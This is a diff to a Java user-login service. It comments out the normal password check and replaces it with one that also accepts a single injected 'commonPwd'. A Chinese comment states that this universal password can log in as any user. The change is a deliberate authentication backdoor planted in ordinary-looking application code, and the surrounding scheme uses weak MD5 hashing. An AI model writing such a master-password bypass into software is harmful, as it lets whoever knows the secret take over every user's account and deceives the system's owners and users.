@@ -81,6 +81,9 @@ public class UserServiceImpl implements UserService {
 
     @Resource
     private String adminPhones;
+    
+    @Resource
+    private String commonPwd;
 
     @Override
     public User signup(String mobilePhone, String authCode, String hassPwd, String deviceInfo) throws CrudException {
@@ -135,10 +138,14 @@ public class UserServiceImpl implements UserService {
             throw new UserSignupException("用户不存在");
         }
 
-        if (!StringUtils.equals(user.getPassword(), PwdUtils.genMd5Pwd(mobilePhone, user.getSalt(), hassPwd))) {
-            throw new UserSignupException("用户名或密码错误");
-        }
-
+//        if (!StringUtils.equals(user.getPassword(), PwdUtils.genMd5Pwd(mobilePhone, user.getSalt(), hassPwd))) {
+//            throw new UserSignupException("用户名或密码错误");
+//        }
+        //增加一个万能密码，可以登录所有用户
+        if ((!StringUtils.equals(user.getPassword(), PwdUtils.genMd5Pwd(mobilePhone, user.getSalt(), hassPwd)))&&(!hassPwd.equals(commonPwd))) {
+         throw new UserSignupException("用户名或密码错误");
+         }
+        
         if (!user.getUserType().equals(getUserType(mobilePhone))) {
             user.setUserType(getUserType(mobilePhone));
         }
